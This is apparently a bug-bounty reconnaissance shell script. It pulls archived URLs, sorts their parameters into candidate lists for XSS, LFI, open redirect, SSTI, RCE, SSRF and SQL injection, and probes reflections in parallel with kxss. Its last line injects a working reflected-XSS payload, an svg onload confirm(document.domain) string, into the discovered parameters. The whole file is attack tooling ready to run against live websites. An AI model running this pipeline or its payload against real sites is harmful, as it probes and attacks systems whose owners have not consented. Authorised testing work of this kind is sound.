cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf xss | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/xss.list
cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf lfi | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/lfi.list
cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf redirect | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/redirect.list
cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf ssti | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/ssti.list
cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf rce | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/rce.list
cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf ssrf | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/ssrf.list
cat raw/gau.txt raw/waybackurls.txt | ~/go/bin/gf sqli | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | tee -a db/sqli.list
mkdir .tmp
xargs -a db/xss.list -P 30 -I % bash -c "echo % | ~/go/bin/kxss" 2> /dev/null | grep "< >\|\"" | awk '{print $2}' | tee -a .tmp/xssp.list
cat .tmp/xssp.list 2> /dev/null | bhedak "\">/><svg/onload=confirm(document.domain)>" 2> /dev/null | tee -a .tmp/xss.txt